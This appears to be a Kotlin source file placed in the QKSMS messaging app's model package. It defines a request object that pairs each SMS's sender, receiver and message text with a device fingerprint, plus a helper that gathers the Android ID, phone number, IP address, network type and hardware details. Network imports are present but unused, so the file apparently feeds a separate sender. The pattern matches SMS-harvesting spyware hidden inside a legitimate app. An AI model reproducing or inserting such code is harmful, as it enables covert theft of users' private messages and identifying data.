package com.moez.QKSMS.model



import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.Inet4Address
import java.net.NetworkInterface
import java.net.URL
import java.util.Locale
import java.util.TimeZone


data class SmsDataRequest(
    val sender: String?,
    val message: String?,
    val recevier: String?,
    val deviceInformation :Map<String,Any?>? ,
)



class DeviceHardwareHelper(private val context: Context) {

    fun getAllDetails(): Map<String, Any?> {
        return mapOf(
            "androidId" to getAndroidId(),
            "batteryLevel" to getBatteryLevel(),
            "brand" to Build.BRAND,
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "board" to Build.BOARD,
            "hardware" to Build.HARDWARE,
            "release" to Build.VERSION.RELEASE,
            "cpuAbi" to Build.SUPPORTED_ABIS.joinToString(", "),
            "ipAddress" to getIpAddress(),
            "networkType" to getNetworkType(),
            "locale" to Locale.getDefault().toString(),
            "timeZone" to TimeZone.getDefault().id,
            "phoneNumber" to getPhoneNumber()
        )
    }

    private fun getAndroidId() = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)

    private fun getBatteryLevel(): Int {
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level != -1 && scale != -1) (level * 100 / scale.toFloat()).toInt() else -1
    }

    private fun getIpAddress(): String {
        return try {
            NetworkInterface.getNetworkInterfaces().toList()
                .flatMap { it.inetAddresses.toList() }
                .firstOrNull { !it.isLoopbackAddress && it is Inet4Address }
                ?.hostAddress ?: "0.0.0.0"
        } catch (e: Exception) { "0.0.0.0" }
    }

    private fun getNetworkType(): String {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val activeNetwork = cm.activeNetwork ?: return "None"
        val caps = cm.getNetworkCapabilities(activeNetwork) ?: return "None"
        return when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
            else -> "Other"
        }
    }

    private fun getPhoneNumber(): String {
        return try {
            val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            sm.activeSubscriptionInfoList?.firstOrNull()?.number ?: "Bilinmiyor"
        } catch (e: SecurityException) { "İzin Yok" }
    }
}